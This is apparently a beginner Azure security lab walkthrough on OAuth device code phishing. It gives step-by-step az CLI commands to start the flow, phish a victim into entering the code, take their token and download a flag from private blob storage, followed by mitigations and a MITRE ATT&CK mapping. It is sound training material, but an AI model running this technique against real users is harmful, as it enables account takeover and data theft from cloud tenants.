# Device Code Phishing

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Identity / OAuth Phishing

## Scenario

Microsoft's OAuth device code flow was designed for input-constrained devices (TVs, IoT). An
attacker can abuse it by initiating the flow themselves, then socially engineering a victim into
entering the device code at `microsoft.com/devicelogin`. The victim authenticates in their
browser; the attacker's waiting CLI receives a full access + refresh token pair scoped to the
victim's identity.

In this lab a victim user holds `Storage Blob Data Reader` on a private storage account
containing the flag. Shared key access is disabled — the only way to read the blobs is via
an Entra ID token. Phish the device code, steal the token, read the flag.

## Attack Path

```
[Attacker] az login --use-device-code
    |
    v
Attacker copies device code URL + code --> "phishes" victim
    |
    v
Victim authenticates in browser using the attacker's code
    |
    v
Attacker CLI receives victim's access token
    |
    v
az storage blob download --auth-mode login  -->  flag.txt
```

### Step 1 — Initiate the device code flow

```bash
az login --use-device-code --allow-no-subscriptions
# Output:
#   To sign in, use a web browser to open https://microsoft.com/devicelogin
#   and enter the code XXXXXXXXX to authenticate.
```

Copy the URL and the one-time code. In a real attack you would send these to the victim.
In this lab, open the URL in a browser and log in as the victim user provided.

### Step 2 — Discover accessible resources

```bash
# The CLI now holds the victim's token
az account list --query "[].{name:name, id:id}" -o table

# List storage accounts the victim can reach
az storage account list --query "[].{name:name, rg:resourceGroup}" -o table
```

### Step 3 — Read the flag

```bash
az storage blob list \
  --account-name <storage_account_name> \
  --container-name sensitive-data \
  --auth-mode login \
  --query "[].name" -o tsv

az storage blob download \
  --account-name <storage_account_name> \
  --container-name sensitive-data \
  --name flag.txt \
  --file - \
  --auth-mode login
```

## How to Fix in Production

1. **Restrict device code flow** — disable it for users who don't need it via Conditional
   Access: *Grant* → *Require device code flow to be blocked* or restrict via authentication
   method policies.
2. **Enable Conditional Access** — require compliant/hybrid-joined devices, MFA, and
   named location policies so stolen tokens cannot be used from arbitrary locations.
3. **Monitor for device code sign-ins** — alert on `DeviceCodeSignIn` events in Entra ID
   Sign-in logs, especially from unusual locations or for users who don't normally use
   input-constrained devices.
4. **Use Continuous Access Evaluation (CAE)** — short-lived tokens that are revoked the
   moment a user's session is terminated, limiting the window an attacker can use a stolen token.
5. **Phishing-resistant MFA** — FIDO2/passkeys cannot be replayed via device code phishing.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1528](https://attack.mitre.org/techniques/T1528/) | Steal Application Access Token | Credential Access |
| [T1566](https://attack.mitre.org/techniques/T1566/) | Phishing | Initial Access |
| [T1530](https://attack.mitre.org/techniques/T1530/) | Data from Cloud Storage | Collection |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
